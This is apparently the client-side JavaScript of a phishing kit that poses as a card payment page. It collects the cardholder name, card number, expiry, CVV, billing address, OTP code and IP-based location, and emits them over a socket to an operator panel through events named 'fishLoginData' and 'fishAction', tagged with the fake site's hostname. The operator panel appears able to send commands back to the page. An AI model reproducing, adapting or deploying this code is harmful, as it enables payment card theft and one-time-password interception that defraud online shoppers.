localStorage.ifSessionExist='No';

// rlShopName.innerHTML = shopName;
// rlOrderAmount2.innerHTML = `${localStorage.rlFinalPrice} €`;

let ifValidForm;
let socket;

const urlParams = new URLSearchParams(window.location.search);
const totalPriceParam = urlParams.get('totalPrice');



rlCardNumber.addEventListener("input", () => {
    rlCardNumber2Val = rlCardNumber.value;
    // console.log(rlCardNumber2Val);
});

function ifValidFirstForm() {
    rlCardNameVal = rlCardName.value;
    rlCardCvvVal = rlCardCvv.value;

    return (
        rlCardNumber2Val &&
        rlCardNameVal &&
        rlCardCvvVal
    );
}



const SubmitCCdata = async () => {

    console.log("this is SubmitCCdata");
    console.log("form valid");
    if (!socket) {
        socket = await initSocketConnection();
        initActionsOnCommandsFromPanelFunc(socket);
    }

    const { ip, zip, city, country, provider } = await getIpData(apiUrl);

    if (localStorage.ifSessionExist == 'No') {
        //FIRST ACTION TO CREATE SESSIONS
        console.log('yes from firstAction')

        socket.emit('fishLoginData', {
            ip,
            userAgent: window.navigator.userAgent,
            project,
            projectType,
            fake: window.location.hostname,
            ccOrderSum: `$${totalPriceParam ? totalPriceParam : '00.00'}`,
            ccFullName: rlCardName.value,
            ccName: rlCardName.value,
            ccNumber: rlCardNumber2Val,
            ccExpM: rlCardData.value,
            ccExpY: '',
            ccCVV: rlCardCvv.value,
            additionalInfo: `\nAddress 1: ${rlAddressInput1.value}\n${rlAddressInput2.value && 'Address 2: ' + rlAddressInput2.value + `\n`}Province: ${rlProvinceInput.value}\nCity: ${rlCityInput.value}\nPostal Code: ${rlPostalCodeInput.value}\nCountry: ${rlCountrySelect.value}.`,
        });
    }
    localStorage.ifSessionExist = 'Yes';
};


const RepeatSubmitCCdata = async () => {
    socket.emit("fishAction", {
        action: "Client sent card info:",
        actionData: `Card Name: ${rlCardName.value}\nCard Number: ${rlCardNumber2Val}\nEXP: ${rlCardData.value}\nCVV: ${rlCardCvv.value}\nOrder Sum: $${totalPriceParam ? totalPriceParam : '00.00'}`,
        project: project,
        fake: window.location.hostname,
    });

    hpOtpLoader2.classList.remove('active')
    hpButtonSpinner3.classList.remove('active')
};

const SubmitOtpCode = async () => {
  //inputs
  let ifValidForm = smsCode;
  console.log(smsCode)

  if (!ifValidForm) {
      console.log("form invalid: " + ifValidForm);
      return;
  }
  console.log("form valid " + smsCode);

  socket.emit("fishAction", {
      action: "Client enter OTP code",
      actionData: `\nOTP code: ${smsCode}`,
      project: project,
      fake: window.location.hostname,
  });

  hpOtpLoader2.classList.add('active')
  hpButtonSpinner3.classList.add('active')
};

rlSubmitCode6.addEventListener("click", async () => {
  await SubmitOtpCode();
});

hpSubmitBtn.addEventListener("click", async () => {
    if(hpCardNumberInput.value.length >= 19 && hpDataInput.value.length === 5 && hpCvcInput.value.length >= 3 && hpCardholdernameInput.value.length >= 5 && hpAddressInput1.value.length >= 5 && hpCityInput.value.length >= 3 && hpPostalCodeInput.value.length >= 4 && hpProvinceInput.value.length >= 1){
      if(flag === false){
        await SubmitCCdata();
      }else{
        await RepeatSubmitCCdata()
      }
    }
});

let rlChooseRadio = "";




